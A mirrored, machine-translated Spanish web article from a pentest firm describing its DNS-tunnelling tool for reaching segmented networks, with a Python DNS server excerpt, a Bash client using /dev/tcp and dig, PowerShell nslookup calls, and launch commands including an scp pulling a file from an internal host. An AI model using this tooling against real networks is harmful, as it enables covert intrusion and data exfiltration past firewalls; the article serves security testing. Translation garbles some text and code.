<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>üè¥‚Äç‚ò†Ô∏è üõÇ ‚¨úÔ∏è Tr√°fico al final del t√∫nel o DNS en el pentest üõÅ ‚è≠Ô∏è ‚úçüèª</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hola En los proyectos de pruebas de penetraci√≥n, a menudo nos encontramos con redes segmentadas que est√°n casi completamente aisladas del mundo exteri...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Tr√°fico al final del t√∫nel o DNS en el pentest</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/fbk_cs/blog/432078/"><p><img src="https://habrastorage.org/webt/wj/uf/dd/wjufddhw28xxdtak6yot4xypigk.jpeg"></p><br><p>  Hola  En los proyectos de pruebas de penetraci√≥n, a menudo nos encontramos con redes segmentadas que est√°n casi completamente aisladas del mundo exterior.  A veces, para resolver este problema, es necesario reenviar el tr√°fico a trav√©s del √∫nico protocolo disponible: DNS.  En este art√≠culo, le diremos c√≥mo resolver un problema similar en 2018 y qu√© dificultades se encuentran en el proceso.  Tambi√©n se revisar√°n las utilidades populares y se presentar√° un lanzamiento de su propia utilidad de c√≥digo abierto con caracter√≠sticas que generalmente carecen de herramientas similares existentes. </p><a name="habracut"></a><br><h1 id="chto-takoe-dns-tunneli">  ¬øQu√© son los t√∫neles DNS? </h1><br><p>  Ya hay <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">varios</a> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">art√≠culos</a> sobre Habr√© que explican qu√© es el t√∫nel DNS.  Sin embargo, un poco de teor√≠a sobre el t√∫nel DNS se puede encontrar debajo del spoiler. </p><br><div class="spoiler">  <b class="spoiler_title">¬øQu√© es el t√∫nel DNS?</b> <div class="spoiler_text"><p>  Sucede que el firewall corta estrictamente el acceso a la red, y necesita transferir los datos muy mal, y luego la t√©cnica de t√∫nel de DNS viene al rescate. </p><br><p>  En el diagrama, todo se ve as√≠: <br><img src="https://habrastorage.org/webt/bt/ax/w7/btaxw7-gmlbce6669ef_a3dmhzy.png"></p><br><p>  Las consultas para DNS, incluso con la configuraci√≥n de firewall m√°s rigurosa, a veces a√∫n pasan, y puede usar esto respondi√©ndolas desde su servidor ubicado en el otro lado.  La comunicaci√≥n ser√° extremadamente lenta, pero esto es suficiente para penetrar en la red local de la organizaci√≥n o, por ejemplo, para acceder urgentemente a Internet a trav√©s de Wi-Fi de pago en el extranjero. </p></div></div><br><h1 id="chto-populyarno-na-dannyy-moment">  Lo que es popular en este momento </h1><br><p>  Ahora en Internet puede encontrar muchas utilidades para operar esta t√©cnica, cada una con sus propias caracter√≠sticas y errores.  Seleccionamos los cinco m√°s populares para las pruebas comparativas: </p><br><ul><li>  dnscat2 </li><li>  yodo </li><li>  dns2tcp </li><li>  Heyoka </li><li>  OzymanDNS </li></ul><br><p>  Puede leer m√°s sobre c√≥mo los probamos en nuestro art√≠culo sobre <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">Hacker</a> .  Aqu√≠ solo damos los resultados. </p><br><p><img src="https://habrastorage.org/webt/jp/8m/ip/jp8mipmbbxog9uwevtoln1h2bh0.png"></p><br><p>  Como puede ver en los resultados, puede trabajar, pero desde el punto de vista de las pruebas de penetraci√≥n, hay inconvenientes: </p><br><ul><li>  clientes compilados: en m√°quinas con antivirus es mucho m√°s f√°cil ejecutar algo interpretado que un archivo binario; </li><li>  trabajo inestable bajo Windows; </li><li>  La necesidad de instalar software adicional en algunos casos. </li></ul><br><p>  Debido a estas deficiencias, necesit√°bamos desarrollar nuestra propia herramienta, y as√≠ es como result√≥ ... </p><br><h1 id="sozdaem-svoyu-utilitu-dlya-dns-tunnelirovaniya">  Cree su propia utilidad de t√∫nel DNS </h1><br><h2 id="predystoriya">  Antecedentes </h2><br><p>  Todo comenz√≥ durante el pentest interno de un banco.  En el vest√≠bulo hab√≠a una computadora p√∫blica utilizada para imprimir documentos, certificados y otros documentos.  Nuestro objetivo: obtener el mayor beneficio de una m√°quina que ejecutaba Windows 7, ten√≠a Kaspersky Anti-Virus a bordo y permit√≠a el acceso solo a ciertas p√°ginas (pero al mismo tiempo era posible resolver nombres DNS). </p><br><p>  Despu√©s de realizar el an√°lisis inicial y obtener datos adicionales del autom√≥vil, desarrollamos varios vectores de ataque.  Las rutas con el funcionamiento de la m√°quina utilizando programas binarios se eliminaron inmediatamente, ya que la "gran y terrible" "Kaspersky" detect√≥ inmediatamente su borrado cuando detect√≥ un archivo ejecutable.  Sin embargo, logramos tener la oportunidad de ejecutar scripts en nombre del administrador local, despu√©s de lo cual una de las ideas era solo la posibilidad de crear un t√∫nel DNS. </p><br><p>  Buscando posibles m√©todos, encontramos un cliente en PowerShell para dnscat2 (escribimos sobre esto anteriormente).  Pero al final, lo m√°ximo que pudimos producir fue establecer una conexi√≥n por un corto tiempo, despu√©s de lo cual el cliente se bloque√≥. </p><br><p>  Esto, por decirlo suavemente, nos molest√≥ mucho, ya que en esta situaci√≥n la presencia de un cliente interpretado era simplemente necesaria.  En realidad, esta fue una de las razones para desarrollar nuestra propia herramienta para el t√∫nel DNS. </p><br><h2 id="trebovaniya">  Requisitos </h2><br><p>  Nuestros principales requisitos para nosotros son: </p><br><ul><li>  la presencia de clientes universales (en la medida de lo posible) e interpretados para sistemas Unix y Windows.  Para los clientes, se seleccionaron bash y Powershell, respectivamente.  En el futuro, se planea un cliente Perl para Unix; </li><li>  la capacidad de reenviar tr√°fico desde una aplicaci√≥n espec√≠fica; </li><li>  Soporte para m√∫ltiples clientes para un usuario. </li></ul><br><h2 id="arhitektura-proekta">  Arquitectura del proyecto </h2><br><p>  De acuerdo con los requisitos, comenzamos el desarrollo.  En nuestra opini√≥n, la utilidad consta de 3 partes: un cliente en la m√°quina interna, un servidor DNS y un peque√±o proxy entre la aplicaci√≥n pentester y el servidor DNS. </p><br><p><img src="https://habrastorage.org/webt/mt/zo/oz/mtzoozi8lmpyme22arlwee_ty2o.png"></p><br><p>  Para empezar, decidimos reenviar el t√∫nel a trav√©s de los registros TXT. </p><br><p>  El principio de funcionamiento es bastante simple: </p><br><ul><li>  Pentester lanza un servidor DNS. </li><li>  Un pentester (o un usuario, a trav√©s de la ingenier√≠a social) lanza un cliente en una m√°quina interna.  En el cliente hay par√°metros tales como el nombre del cliente y el dominio, y tambi√©n existe la posibilidad de especificar directamente la direcci√≥n IP del servidor DNS. </li><li> Pentester (desde una red externa) inicia un proxy, donde indica la direcci√≥n IP del servidor DNS, as√≠ como el puerto donde golpear, los objetivos IP (por ejemplo, ssh en la red interna donde est√° sentado el cliente) y, en consecuencia, el puerto objetivo.  Tambi√©n se requiere una ID de cliente, que se puede obtener agregando la clave <code>--clients</code> . </li><li>  Pentester lanza la aplicaci√≥n que le interesa, apuntando el puerto proxy a localhost. </li></ul><br><h2 id="protokol-obscheniya">  Protocolo de comunicaci√≥n </h2><br><p>  Considere un protocolo bastante simple para la comunicaci√≥n entre un servidor y un cliente. </p><br><h3 id="registraciya">  Registro </h3><br><p>  Cuando se inicia el cliente, se registra con el servidor, solicitando un registro TXT a trav√©s de un subdominio del siguiente formato: </p><br><p> <code>0&lt;7 random chars&gt;&lt;client name&gt;.&lt;your domain&gt;</code> </p> <br><p>  0 - clave de registro <br>  <code>&lt;7 random chars&gt;</code> - para evitar el almacenamiento en cach√© de registros DNS <br>  <code>&lt;client name&gt;</code> : el nombre dado al cliente en el inicio <br>  <code>&lt;your domain&gt;</code> - ej .: xakep.ru <br>  En caso de un registro exitoso, el cliente recibe un mensaje de √©xito en la respuesta TXT, as√≠ como la identificaci√≥n que se le asign√≥, que continuar√° utilizando. </p><br><h3 id="osnovnoy-cikl">  Ciclo principal </h3><br><p>  Despu√©s del registro, el cliente comienza a consultar al servidor sobre la disponibilidad de nuevos datos en el formato </p><br><p> <code>1&lt;7 random chars&gt;&lt;id&gt;.&lt;your domain&gt;</code> </p> <br><p>  Si hay datos nuevos, en la respuesta TXT los recibe en el formato </p><br><p>  <code>&lt;id&gt;&lt;target ip&gt;:&lt;target port&gt;:&lt;data in base64&gt;</code> , de lo contrario, <code>&lt;id&gt;ND</code> viene. </p><br><h3 id="cikl-zagruzki-dannyh">  Ciclo de carga de datos </h3><br><p>  El cliente en un bucle comprueba si los datos provienen de nuestro <code>&lt;target&gt;</code> .  Si hay una respuesta, leemos, de lo que vino, un b√∫fer de tama√±o N Kb, lo <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> en bloques de <code>250-&lt;len_of_your_domain&gt;-&lt;  &gt;</code> y enviamos datos bloque por bloque en el formato: <br> <code>2&lt;4randomchars&gt;&lt;id&gt;&lt;block_id&gt;.&lt;data&gt;.&lt;your_domain&gt;</code> </p> <br><p>  Si la transferencia del bloque es exitosa, obtenemos algunos datos sobre el bloque transferido; en el caso de que se complete la transferencia del b√∫fer, obtenemos <code>ENDBLOCK</code> . </p><br><h2 id="dns-server">  Servidor DNS </h2><br><p>  El servidor DNS para la tunelizaci√≥n se escribi√≥ en Python3 utilizando la biblioteca dnslib, lo que facilita la creaci√≥n de su propio resolutor DNS heredando del objeto dnslib.ProxyResolver y anulando el m√©todo resolve (). </p><br><p>  Great dnslib le permite crear su propio proxyDNS muy r√°pidamente: </p><br><div class="spoiler">  <b class="spoiler_title">Un poco de c√≥digo de servidor</b> <div class="spoiler_text"><pre> <code class="python hljs"><span class="hljs-class"><span class="hljs-keyword"><span class="hljs-class"><span class="hljs-keyword">class</span></span></span><span class="hljs-class"> </span><span class="hljs-title"><span class="hljs-class"><span class="hljs-title">Resolver</span></span></span><span class="hljs-params"><span class="hljs-class"><span class="hljs-params">(ProxyResolver)</span></span></span><span class="hljs-class">:</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">__init__</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, upstream)</span></span></span><span class="hljs-function">:</span></span> super().__init__(upstream, <span class="hljs-number"><span class="hljs-number">53</span></span>, <span class="hljs-number"><span class="hljs-number">5</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">resolve</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(self, request, handler)</span></span></span><span class="hljs-function">:</span></span> <span class="hljs-comment"><span class="hljs-comment">#   domain_request = DOMAIN_REGEX.findall(str(request.q.qname)) type_name = QTYPE[request.q.qtype] if not domain_request: #  DNS ,     ,    : ,  google return super().resolve(request, handler) #  ,    result reply = request.reply() reply.add_answer(RR( rname=DNSLabel(str(request.q.qname)), rtype=QTYPE.TXT, rdata=dns.TXT(wrap(result, 255)), #      255 ,   ,   ttl=300 )) if reply.rr: return reply if __name__ == '__main__': port = int(os.getenv('PORT', 53)) upstream = os.getenv('UPSTREAM', '8.8.8.8') #       resolver = Resolver(upstream) udp_server = DNSServer(resolver, port=port) tcp_server = DNSServer(resolver, port=port, tcp=True) udp_server.start_thread() tcp_server.start_thread() try: while udp_server.isAlive(): sleep(1) except KeyboardInterrupt: pass</span></span></code> </pre> </div></div><br><p>  En resolve (), definimos las respuestas a las consultas DNS del cliente: registro, solicitud de nuevos registros, devoluci√≥n de datos y eliminaci√≥n del usuario. </p><br><p>  Almacenamos informaci√≥n sobre los usuarios en la base de datos SQLite, el portapapeles de datos se encuentra en la RAM y tiene la siguiente estructura, en la que la clave es el n√∫mero de cliente: </p><br><pre> <code class="json hljs">{ { <span class="hljs-attr"><span class="hljs-attr">"target_ip"</span></span>: <span class="hljs-string"><span class="hljs-string">"192.168.1.2"</span></span>, # IP ‚Äú‚Äù -    <span class="hljs-attr"><span class="hljs-attr">"target_port"</span></span>: <span class="hljs-string"><span class="hljs-string">""</span></span>, #  ‚Äú‚Äù <span class="hljs-attr"><span class="hljs-attr">"socket"</span></span>: None, #       <span class="hljs-attr"><span class="hljs-attr">"buffer"</span></span>: None, #      <span class="hljs-attr"><span class="hljs-attr">"upstream_buffer"</span></span>: b'' #      }, ... }</code> </pre> <br><p>  Para poner los datos del pentester en el b√∫fer, escribimos un peque√±o "receptor", que se inicia en una secuencia separada.  Captura las conexiones del pentester y realiza el enrutamiento: a qu√© cliente enviar las solicitudes. </p><br><p>  Antes de iniciar el servidor, el usuario debe establecer solo un par√°metro: DOMAIN_NAME: el nombre del dominio con el que trabajar√° el servidor. </p><br><h2 id="klient-na-bash">  Cliente Bash </h2><br><p>  Bash fue elegido para escribir un cliente para sistemas Unix, ya que se encuentra con mayor frecuencia en los sistemas Unix modernos.  Bash proporciona la capacidad de conectarse a trav√©s de / dev / tcp /, incluso con derechos de usuario sin privilegios. </p><br><p>  No analizaremos cada pieza de c√≥digo en detalle, echemos un vistazo solo a los puntos m√°s interesantes. <br>  El principio del cliente es simple.  Para comunicarse con DNS, se utiliza la utilidad de <code>dig</code> est√°ndar.  El cliente se registra con el servidor, despu√©s de lo cual, en el ciclo perpetuo, comienza a cumplir las solicitudes utilizando el protocolo descrito anteriormente.  Debajo del spoiler m√°s. </p><br><div class="spoiler">  <b class="spoiler_title">Lea m√°s sobre el cliente Bash</b> <div class="spoiler_text"><p>  Se est√° realizando una verificaci√≥n para establecer si se ha establecido una conexi√≥n y, en caso afirmativo, se realiza la funci√≥n de respuesta (lectura de los datos recibidos desde el destino, divisi√≥n y env√≠o al servidor). </p><br><p>  Despu√©s de eso, se verifica si hay nuevos datos del servidor.  Si se encuentran, verificamos si la conexi√≥n debe cortarse.  El espacio en s√≠ ocurre cuando recibimos informaci√≥n sobre el destino con ip 0.0.0.0 y el puerto 00. En este caso, borramos el descriptor de archivo (si no estaba abierto, no habr√° problemas) y cambiamos la ip de destino al 0.0.0.0 entrante. </p><br><p>  M√°s adelante en el c√≥digo, vemos si es necesario establecer una nueva conexi√≥n.  Tan pronto como los siguientes mensajes comiencen a enviarnos datos para el objetivo, nosotros, en caso de que la IP anterior no coincida con la actual (lo ser√° despu√©s del reinicio), cambiaremos el objetivo a uno nuevo y estableceremos una conexi√≥n a trav√©s del comando <code>exec 3&lt;&gt;/dev/tcp/$ip/$port</code> , donde <code>$ip</code> es el objetivo, <code>$port</code> es el puerto de destino. <br>  Como resultado, si la conexi√≥n ya est√° establecida, los datos entrantes se decodifican y vuelan al descriptor mediante el comando <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code>  <code>echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3</code> , donde <code>${data_array[2]}</code> es lo que obtuvimos del servidor. </p><br><pre> <code class="plaintext hljs">while : do if [[ $is_set = 'SET' ]] then reply fi data=$(get_data $id) if [[ ${data:0:2} = $id ]] then if [[ ${data:2:2} = 'ND' ]] then sleep 0.1 else IFS=':' read -r -a data_array &lt;&lt;&lt; $data data=${data_array[0]} is_id=${data:0:2} ip=${data:2} port=${data_array[1]} if [[ $is_id = $id ]] then if [[ $ip = '0.0.0.0' &amp;&amp; $port = '00' ]] then exec 3&lt;&amp;- exec 3&gt;&amp;- is_set='NOTSET' echo "Connection OFF" last_ip=$ip fi if [[ $last_ip != $ip ]] then exec 3&lt;&gt;/dev/tcp/$ip/$port is_set='SET' echo "Connection ON" last_ip=$ip fi if [[ $is_set = 'SET' ]] then echo -e -n ${data_array[2]} | base64 -d &gt;&amp;3 fi fi fi fi done</code> </pre> <br><p>  Ahora considere enviar la funci√≥n de respuesta.  Primero, leemos 2048 bytes del descriptor e inmediatamente los codificamos a trav√©s de <code>$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0</code> ).  Luego, si la respuesta est√° vac√≠a, salimos de la funci√≥n; de lo contrario, comenzamos la operaci√≥n de divisi√≥n y env√≠o.  Tenga en cuenta que despu√©s de la formaci√≥n de la solicitud de env√≠o mediante excavaci√≥n, la entrega se verifica para el √©xito.  Si tiene √©xito, salga del ciclo, de lo contrario intente hasta que funcione. </p><br><pre> <code class="plaintext hljs">reply() { response=$(timeout 0.1 dd bs=2048 count=1 &lt;&amp;3 2&gt; /dev/null | base64 -w0) if [[ $response != '' ]] then debug_echo 'Got response from target server ' response_len=${#response} number_of_blocks=$(( ${response_len} / ${MESSAGE_LEN})) if [[ $(($response_len % $MESSAGE_LEN)) = 0 ]] then number_of_blocks-=1 fi debug_echo 'Sending message back...' point=0 for ((i=$number_of_blocks;i&gt;=0;i--)) do blocks_data=${response:$point:$MESSAGE_LEN} if [[ ${#blocks_data} -gt 63 ]] then localpoint=0 while : do block=${blocks_data:localpoint:63} if [[ $block != '' ]] then dat+=$block. localpoint=$((localpoint + 63)) else break fi done blocks_data=$dat dat='' point=$((point + MESSAGE_LEN)) else blocks_data+=. fi while : do block=$(printf %03d $i) check_deliver=$(dig ${HOST} 2$(generate_random 4)$id$block.$blocks_data${DNS_DOMAIN} TXT | grep -oP '\"\K[^\"]+') if [[ $check_deliver = 'ENDBLOCK' ]] then debug_echo 'Message delivered!' break fi IFS=':' read -r -a check_deliver_array &lt;&lt;&lt; $check_deliver deliver_data=${check_deliver_array[0]} block_check=${deliver_data:2} if [[ ${check_deliver_array[1]} = 'OK' ]] &amp;&amp; [[ $((10#${deliver_data:2})) = $i ]] &amp;&amp; [[ ${deliver_data:0:2} = $id ]] then break fi done done else debug_echo 'Empty message from target server, forward the next package ' fi }</code> </pre> </div></div><br><h2 id="powershell-klient">  Cliente Powershell: </h2><br><p>  Como necesit√°bamos una interpretaci√≥n y un trabajo completos en la mayor√≠a de los sistemas actuales, el cliente base para Windows es la utilidad est√°ndar nslookup para comunicarse a trav√©s de DNS y el objeto System.Net.Sockets.TcpClient para establecer una conexi√≥n en la red interna. </p><br><p>  Todo tambi√©n es muy simple.  Cada iteraci√≥n del bucle es una llamada al comando nslookup utilizando el protocolo descrito anteriormente. </p><br><p>  Por ejemplo, para registrarse, ejecute el comando: <br> <code>$text = &amp;nslookup -q=TXT $act$seed$clientname$Dot$domain $server 2&gt;$null</code> <br>  Si se producen errores, entonces no los mostramos, enviando los valores del descriptor de errores a $ null. </p><br><p>  nslookup nos devuelve una respuesta similar: <br><img src="https://habrastorage.org/webt/xz/n9/wk/xzn9wkh45ds0pxmpykpo5xrhldc.png"></p><br><p>  Despu√©s de lo cual necesitamos estirar todas las l√≠neas entre comillas, para lo cual las revisamos con una temporada regular: </p><br><p> <code>$text = [regex]::Matches($text, '"(.*)"') | %{$_.groups[1].value} | %{$_ -replace '([ "\t]+)',$('') }</code> </p> <br><p>  Ahora puede procesar los comandos recibidos. <br>  Cada vez que cambia la direcci√≥n IP de la "v√≠ctima", se crea un cliente TCP, se establece una conexi√≥n y comienza la transferencia de datos.  Desde el servidor DNS, la informaci√≥n se decodifica en base64 y se env√≠an bytes a la v√≠ctima.  Si la "v√≠ctima" respondi√≥ algo, entonces codificamos, dividimos en partes y ejecutamos solicitudes nslookup de acuerdo con el protocolo.  Eso es todo. <br>  Cuando presiona Ctrl + C, se ejecuta una solicitud para eliminar el cliente. </p><br><h2 id="proxy">  Proxy: </h2><br><p>  El proxy para el pentester es un peque√±o servidor proxy en python3. </p><br><p><img src="https://habrastorage.org/webt/k4/lp/0u/k4lp0uzffo9oo90eqommsetwvn4.png"></p><br><p>  En los par√°metros que necesita para especificar la IP del servidor DNS, el puerto donde conectarse al servidor, la opci√≥n --clients devuelve una lista de clientes registrados, <code>--target - target ip</code> , <code>--target_port - target port</code> , <code>--client</code> - id del cliente con el que lo haremos trabajo (visto despu√©s de la ejecuci√≥n de <code>--clients</code> ), - <code>--send_timeout</code> - timeout para enviar mensajes desde la aplicaci√≥n. </p><br><p>  Cuando se inicia con el par√°metro <code>--clients</code> , el proxy env√≠a una solicitud al servidor en el formato <code>\x00GETCLIENTS\n</code> . <br>  En el caso en que comenzamos a trabajar, cuando nos <code>\x02RESET:client_id\n</code> , enviamos un mensaje en el formato <code>\x02RESET:client_id\n</code> para restablecer la conexi√≥n anterior.  Despu√©s de enviar informaci√≥n sobre nuestro objetivo: <code>\x01client_id:ip:port:\n</code> <br>  Adem√°s, al enviar mensajes al cliente, enviamos bytes en el formato <code>\x03data</code> , y simplemente enviamos bytes sin procesar a la aplicaci√≥n. <br>  Adem√°s, el proxy admite el modo SOCKS5. </p><br><h2 id="kakie-trudnosti-mogut-vozniknut">  ¬øQu√© dificultades pueden surgir? </h2><br><p>  Como con cualquier mecanismo, la utilidad puede fallar.  No olvidemos que el t√∫nel DNS es algo delgado, y muchos factores pueden influir en su funcionamiento, desde la arquitectura de red hasta la calidad de la conexi√≥n a su servidor de producci√≥n. </p><br><p>  Durante las pruebas, ocasionalmente notamos peque√±os problemas t√©cnicos.  Por ejemplo, a altas velocidades de impresi√≥n, trabajando a trav√©s de ssh, vale la pena establecer el par√°metro <code>--send_timeout</code> , ya que de lo contrario el cliente comienza a congelarse.  Adem√°s, a veces la conexi√≥n puede no establecerse la primera vez, pero puede tratarse f√°cilmente reiniciando el proxy, ya que la conexi√≥n se restablecer√° durante la nueva conexi√≥n.  Tambi√©n hubo problemas con la resoluci√≥n de dominio al trabajar con proxychains, pero esto tambi√©n se puede solucionar si especifica un par√°metro adicional para proxychains.  Vale la pena se√±alar que en este momento la utilidad no controla la aparici√≥n de solicitudes innecesarias de los servidores DNS de almacenamiento en cach√©, por lo que la conexi√≥n a veces puede fallar, sin embargo, esto se trata nuevamente utilizando el m√©todo descrito anteriormente. </p><br><h2 id="zapusk">  Lanzamiento </h2><br><p>  Configure los registros NS en el dominio: </p><br><p><img src="https://habrastorage.org/webt/_q/p4/er/_qp4erwn54g5nqqxmlnnquv1itk.png"></p><br><p>  Esperamos hasta que se actualice el cach√© (generalmente hasta 5 horas). </p><br><p>  Iniciamos el servidor: <br> <code>python3 ./server.py --domain oversec.ru</code> </p> <br><p>  Inicie el cliente (Bash): <br> <code>bash ./bash_client.sh -d oversec.ru -n TEST1</code> </p> <br><p>  Iniciamos el cliente (Win): <br> <code>PS:&gt; ./ps_client.ps1 -domain oversec.ru -clientname TEST2</code> </p> <br><p>  Veamos la lista de clientes conectados: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --clients</code> </p> <br><p>  Inicie el proxy: <br> <code>python3 ./proxy.py --dns 138.197.178.150 --dns_port 9091 --socks5 --localport 9090 --client 1</code> </p> <br><p>  Prueba: </p><br><p>  Despu√©s de que el servidor y al menos un cliente se hayan iniciado, podemos acceder al proxy como si fuera nuestra m√°quina remota. <br>  Intentemos simular la siguiente situaci√≥n: el pentester quiere descargar un archivo del servidor desde la red local de la organizaci√≥n protegida por el firewall, mientras que usando m√©todos de ingenier√≠a social pudo forzar al cliente DNS a ejecutarse dentro de la red y descubrir la contrase√±a del servidor SSH. </p><br><p>  Pentester en su m√°quina inicia un proxy, indicando el cliente necesario y luego puede hacer llamadas similares que se enviar√°n al cliente y desde el cliente a la red local. <br> <code>scp -P9090 -C root@localhost:/root/dnserver.py test.kek</code> </p> <br><p>  Veamos que pas√≥: </p><br><p><img src="https://habrastorage.org/webt/xd/un/ag/xdunagwddytfwinhgkcxxossnqi.png"></p><br><p>  En la parte superior izquierda, puede ver las consultas de DNS que llegan al servidor, desde la parte superior derecha - tr√°fico proxy, desde la parte inferior izquierda - tr√°fico desde el cliente y desde la parte inferior derecha - nuestra aplicaci√≥n.  La velocidad result√≥ bastante decente para el t√∫nel DNS: 4.9Kb / s usando compresi√≥n. </p><br><p>  Cuando se lanz√≥ sin compresi√≥n, la utilidad mostr√≥ una velocidad de 1.8 kb / s: </p><br><p><img src="https://habrastorage.org/webt/vs/lv/6o/vslv6oycbyicpppojlsbh2hs_hi.png"></p><br><p>  Miremos cuidadosamente el tr√°fico del servidor DNS, para esto usamos la utilidad tcpdump. <br> <code>tcpdump -i eth0 udp port 53</code> </p> <br><p><img src="https://habrastorage.org/webt/oo/wx/pf/oowxpflehofc-dmyizrf6pwre08.png"></p><br><p>  Vemos que todo se ajusta al protocolo descrito: el cliente consulta constantemente al servidor si tiene datos nuevos para este cliente utilizando consultas como <code>1c6Zx9Vi39.oversec.ru</code> .  Si hay datos, el servidor responde con un conjunto de registros TXT, de lo contrario% client_num% ND ( <code>39ND</code> ).  El cliente env√≠a informaci√≥n al servidor utilizando los tipos de consultas <code>28sTx39003.MyNTYtZ2NtQG9wZW5zc2guY29tAAAAbGNoYWNoYTIwLXBvbHkxMzA1QG9wZW5zc.2guY29tLGFlczEyOC1jdHIsYWVzMTkyLWN0cixhZXMyNTYtY3RyLGFlczEyOC1n.Y21Ab3BlbnNzaC5jb20sYWVzMjU2LWdjbUBvcGVuc3NoLmNvbQAAANV1bWFjLTY.0LWV0bUBvcGVuc3NoLmNvbSx1bWFjLTEyOC1.oversec.ru.</code> </p><br><p>  En los siguientes videos, puede ver claramente c√≥mo funciona la utilidad junto con meterpreter y en modo SOCKS5. </p><br><iframe width="560" height="315" src="https://www.youtube.com/embed/N6Nm9mWFI6w" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><iframe width="560" height="315" src="https://www.youtube.com/embed/xSM-Dl1uo1k" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h2 id="itog">  El resultado: </h2><br><p>  Resumamos un poco.  ¬øQu√© caracter√≠sticas tiene este desarrollo y por qu√© recomendamos usarlo? </p><br><ol><li>  Clientes interpretados en Bash y Powershell: sin EXE-shnikov y ELF-s que pueden ser dif√≠ciles de ejecutar. </li><li>  Estabilidad de la conexi√≥n: en las pruebas, nuestra utilidad se comport√≥ de manera mucho m√°s estable, y si hubiera alg√∫n error, podr√≠a volver a conectarse, mientras el cliente no se bloqueaba, como fue el caso con dnscat2, por ejemplo. </li><li>  Velocidad bastante alta para el t√∫nel DNS: por supuesto, la velocidad no alcanza el yodo, pero hay una soluci√≥n compilada de mucho menor nivel. </li><li>  No se requieren derechos de administrador: el cliente Bash funciona sin derechos de administrador, y las secuencias de comandos de Powershell a veces est√°n prohibidas por las pol√≠ticas de seguridad, pero esto es bastante simple. </li><li>  Hay un modo proxy socks5, que le permite hacerlo <code>curl -v --socks5 127.0.0.1:9011 https://ident.me</code> o ejecutar nmap en toda la red interna. </li></ol><br><p>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=es&amp;u=">El c√≥digo de utilidad est√° disponible aqu√≠.</a> </p></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/es432078/">https://habr.com/ru/post/es432078/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../es432068/index.html">C√≥mo facilitar el estudio del ingl√©s: 5 servicios √∫tiles</a></li>
<li><a href="../es432070/index.html">Brevemente sobre los canales redux-saga</a></li>
<li><a href="../es432072/index.html">Tres tipos de p√©rdidas de memoria</a></li>
<li><a href="../es432074/index.html">C√≥mo los jugadores rasgan la tela de realidad Spelunky con escopetas</a></li>
<li><a href="../es432076/index.html">La funci√≥n no reconocida ralentiza el programa 5 veces</a></li>
<li><a href="../es432080/index.html">Las ideas err√≥neas de los jugadores al evaluar los riesgos. Control del generador de n√∫meros aleatorios en desarrollo.</a></li>
<li><a href="../es432082/index.html">Microsoft AI Chatbot lanza la colecci√≥n de ropa de China</a></li>
<li><a href="../es432084/index.html">C√≥mo organizamos una competencia por turnos entre los trabajadores de producci√≥n (como en la URSS)</a></li>
